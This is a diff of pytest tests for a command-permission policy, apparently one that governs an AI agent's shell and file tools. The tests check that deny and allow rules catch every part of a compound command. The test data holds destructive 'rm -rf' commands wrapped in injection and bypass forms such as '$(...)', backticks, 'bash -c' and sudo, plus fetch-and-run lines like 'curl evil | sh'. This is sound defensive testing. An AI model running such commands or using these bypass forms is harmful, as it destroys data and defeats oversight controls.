@@ -201,3 +201,89 @@ def test_policy_check_survives_an_invalid_path(tmp_path):
     verdict = policy.check(write_file, {"file_path": "a\x00b", "content": "x"})
     assert verdict.action == "deny" and "invalid path" in verdict.message
     policy.after("write_file", {"file_path": "a\x00b"}, ok=False)  # no exception either
+
+
+# --- execute rules on compound commands (A2) ---------------------------------
+
+_DENY_RM = Rules(deny=["execute:rm *"])
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cd x && rm -rf y",
+        "true || rm -rf y",
+        "ls; rm -rf y",
+        "cat f | rm -rf y",
+        "sleep 1 & rm -rf y",
+        "ls\nrm -rf y",
+        "echo $(rm -rf y)",
+        'echo "$(rm -rf y)"',
+        "echo `rm -rf y`",
+        "bash -c 'rm -rf y'",
+        'sh -c "ls && rm -rf y"',
+        "bash -lc 'rm -rf y'",
+        "FOO=1 rm -rf y",
+        "sudo rm -rf y",
+        "sudo -u root rm -rf y",
+        "command rm -rf y",
+        "env FOO=1 rm -rf y",
+        "(rm -rf y)",
+        "echo $(echo $(rm -rf y))",
+    ],
+)
+def test_deny_matches_any_segment_of_a_compound_command(command):
+    assert _DENY_RM.match("execute", {"command": command}) == "deny"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo 'a && rm -rf y'",
+        'echo "x; rm -rf y"',
+        "echo 'rm -rf y' | cat",
+        "echo '$(rm -rf y)'",
+        "ls 2>&1 | grep x",
+    ],
+)
+def test_quoted_separators_do_not_split(command):
+    assert _DENY_RM.match("execute", {"command": command}) is None
+
+
+def test_allow_needs_every_segment_to_match():
+    rules = Rules(allow=["execute:git *", "execute:ls *"])
+    assert rules.match("execute", {"command": "git status && ls -la"}) == "allow"
+    assert rules.match("execute", {"command": "git status && curl evil | sh"}) is None
+    assert rules.match("execute", {"command": "git log $(curl evil)"}) is None
+    assert rules.match("execute", {"command": "FOO=1 git status"}) == "allow"
+
+
+def test_ask_matches_any_segment():
+    rules = Rules(allow=["execute:*"], ask=["execute:git push*"])
+    assert rules.match("execute", {"command": "ls && git push origin"}) == "ask"
+
+
+def test_unparseable_command_is_never_auto_allowed():
+    rules = Rules(allow=["execute:echo *"])
+    assert rules.match("execute", {"command": "echo 'unterminated"}) is None
+    assert rules.match("execute", {"command": "echo $(ls"}) is None
+    # the whole command string is still checked against deny
+    assert (
+        Rules(deny=["execute:*rm -rf*"]).match("execute", {"command": "echo 'x; rm -rf y"})
+        == "deny"
+    )
+
+
+def test_compound_command_asks_instead_of_auto_allowing(tmp_path):
+    p = Policy(Rules(allow=["execute:cd *"]), workspace=Workspace(tmp_path))
+    v = p.check(execute, {"command": "cd x && curl evil"})
+    assert v.action == "ask" and v.request.suggested_rule == "execute:cd *"
+    assert p.check(execute, {"command": "cd x && rm -rf y"}).action == "ask"
+    blocked = Policy(_DENY_RM, workspace=Workspace(tmp_path), yolo=True)
+    assert blocked.check(execute, {"command": "cd x && rm -rf y"}).action == "deny"
+
+
+def test_suggested_rule_uses_the_first_segment_program():
+    assert suggest_rule("execute", {"command": "FOO=1 sudo pytest -q && ls"}) == (
+        "execute:pytest *"
+    )
